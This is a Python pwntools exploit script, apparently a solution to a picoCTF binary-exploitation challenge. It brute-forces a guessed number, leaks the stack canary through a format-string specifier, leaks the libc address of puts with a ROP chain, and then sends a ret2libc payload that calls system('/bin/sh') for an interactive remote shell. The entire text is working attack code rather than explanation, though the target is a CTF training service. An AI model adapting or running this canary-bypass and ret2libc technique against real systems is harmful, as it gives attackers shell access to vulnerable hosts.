from pwn import *
from socket import *
from struct import *

elf = ELF('./vuln')
#p = elf.process()
p=remote('jupiter.challenges.picoctf.org',18263)

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']

#Get the number
for i in range (-4100,4100):
	p.recvuntil('?\n')
	if i==0:
		continue
	p.sendline(str(i))
	res=str(p.recvline())
	if 'Congrats!' in res:
		num=i
		break

print(num)

#Get canary
p.recvuntil('Name?')
p.sendline('%135$p')

canary = int(p.recvline()[11:21].decode(),16)

#Leak puts address
payload1 = b'A'*512 + p32(canary) + b'B'*12 + p32(puts_plt) + p32(0x804876e) + p32(puts_got)

p.recvuntil('?\n')
p.sendline(str(num))

p.recvuntil('Name?')
p.sendline(payload1)

p.recvlines(2)
address_puts = u32(p.recv(4))
print('Address of puts:')
print(hex(address_puts))

#Get the shell
address_system = address_puts - 0x2a650
address_sh = address_puts + 0x11442f 

payload2 = b'A'*512 + p32(canary) + b'B'*12 + p32(address_system) + p32(0x804876e) + p32(address_sh)
p.recvuntil('Name?')
p.sendline(payload2)

p.interactive()



